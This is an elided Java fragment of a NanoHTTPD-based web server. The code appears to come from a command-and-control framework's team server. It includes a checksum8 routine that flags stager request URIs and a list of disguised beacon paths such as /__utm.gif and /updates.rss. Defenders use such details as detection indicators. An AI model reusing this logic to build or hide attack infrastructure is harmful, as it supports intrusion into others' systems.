...
public class WebServer extends NanoHTTPD {
    ...
    public static long checksum8(String text) {
        ...
        System.out.println("[checksum8] sum is: " + sum);
        return sum;
    }


    public static boolean isStager(String uri) {
        return (checksum8(uri) == 1019L);
    }
    ...
    public Response _serve(String uri, String method, Properties header, Properties param) {
        ...
        String[] strURL = {"/ca", "/dpixel", "/__utm.gif", "/pixel.gif", "/g.pixel", "/dot.gif", "/updates.rss", "/fwlink", "/cm", "/cx", "/pixel", "/match", "/visit.js", "/load", "/push"};
        Arrays.sort(strURL);
        int index1 = Arrays.binarySearch(strURL, uri);
...
//        }
        ...
        if (this.hooks.containsKey(uri + "/")) {
            System.out.println("[_serve]: 5");
            WebService service = (WebService) this.hooks.get(uri + "/");
            return processResponse(uri + "/", method, header, param, true, service, service.serve(uri, method, header, param));
        }
        if (uri.startsWith("http://")) {
            System.out.println("[_serve]: 6");
